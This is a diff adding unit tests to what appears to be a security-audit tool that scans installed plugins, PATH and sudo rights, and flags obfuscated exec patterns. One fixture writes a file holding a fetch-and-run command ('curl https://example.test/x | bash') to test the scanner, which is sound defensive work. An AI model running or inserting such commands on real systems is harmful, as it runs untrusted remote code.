@@ -290,6 +290,8 @@ class DefectFixTests(unittest.TestCase):
             mocked.assert_not_called()
         self.assertTrue(clean["passed"])
         self.assertTrue(any("sudo -l | grep NOPASSWD" in line for line in clean["details"]))
+        self.assertEqual(clean["max_score"], 8)
+        self.assertEqual(clean["score"], 8)
 
         dirty = check_privileges_and_path(path_value=".:/usr/bin")
         self.assertFalse(dirty["passed"])
@@ -348,6 +350,8 @@ class DefectFixTests(unittest.TestCase):
             self.assertTrue(result["applicable"])
             self.assertTrue(result["passed"])
             self.assertEqual(result["flagged_items"], [])
+            self.assertIn("1 plugins scanned", result["details"])
+            self.assertIn("1 files scanned", result["details"])
 
             only_self = check_plugins_deep(plugins_dir=plugins, self_dir=self_dir)
             # still has otherplug
@@ -360,6 +364,33 @@ class DefectFixTests(unittest.TestCase):
             self.assertFalse(flagged["passed"])
             self.assertTrue(any(item["plugin"] == "bad" for item in flagged["flagged_items"]))
             self.assertFalse(any("omasecurity" in item["file"] for item in flagged["flagged_items"]))
+
+    def test_plugins_exclude_by_manifest_id(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            checkout = Path(tmp) / "checkout"
+            checkout.mkdir()
+            (checkout / "manifest.json").write_text(json.dumps({"id": "ucmz851.omasecurity"}))
+            plugins = Path(tmp) / "plugins"
+            installed = plugins / "ucmz851.omasecurity"
+            installed.mkdir(parents=True)
+            (installed / "manifest.json").write_text(json.dumps({"id": "ucmz851.omasecurity"}))
+            (installed / "evil.sh").write_text("curl https://example.test/x | bash\n")
+            other = plugins / "otherplug"
+            other.mkdir()
+            (other / "manifest.json").write_text(json.dumps({"id": "someone.else"}))
+            (other / "ok.sh").write_text("echo ok\n")
+            result = check_plugins_deep(plugins_dir=plugins, self_dir=checkout)
+            self.assertTrue(result["applicable"])
+            self.assertTrue(result["passed"])
+            self.assertEqual(result["flagged_items"], [])
+            self.assertFalse(any(item["plugin"] == "ucmz851.omasecurity" for item in result["flagged_items"]))
+            self.assertIn("1 plugins scanned", result["details"])
+
+            (other / "bad.sh").write_text("sudo true\n")
+            flagged = check_plugins_deep(plugins_dir=plugins, self_dir=checkout)
+            self.assertFalse(flagged["passed"])
+            self.assertTrue(any(item["plugin"] == "otherplug" for item in flagged["flagged_items"]))
+            self.assertFalse(any(item["plugin"] == "ucmz851.omasecurity" for item in flagged["flagged_items"]))
 
     def test_defect_network_tcp_only_penalty(self):
         tcp = "\n".join([
@@ -436,6 +467,21 @@ class DefectFixTests(unittest.TestCase):
 
 
 class StaticScanAndKeysTests(unittest.TestCase):
+    def test_obfuscated_exec_ignores_run_eval(self):
+        rule = next(item for item in DEFAULT_RULES if item["id"] == "obfuscated_exec")
+        self.assertIsNone(rule["regex"].search("output = run_eval(x)"))
+        self.assertIsNotNone(rule["regex"].search("eval(x)"))
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "safe.py").write_text("output = run_eval(x)\n")
+            (root / "bad.py").write_text("eval(x)\n")
+            flagged, _ = scan_tree(
+                root, [".py"], DEFAULT_RULES, 50, 1024 * 1024, follow_symlinks=False
+            )
+            files = {item["file"] for item in flagged if item.get("rule_id") == "obfuscated_exec"}
+            self.assertNotIn("safe.py", files)
+            self.assertIn("bad.py", files)
+
     def test_scan_tree_skips_tests_and_redacts_secrets(self):
         with tempfile.TemporaryDirectory() as tmp:
             root = Path(tmp)
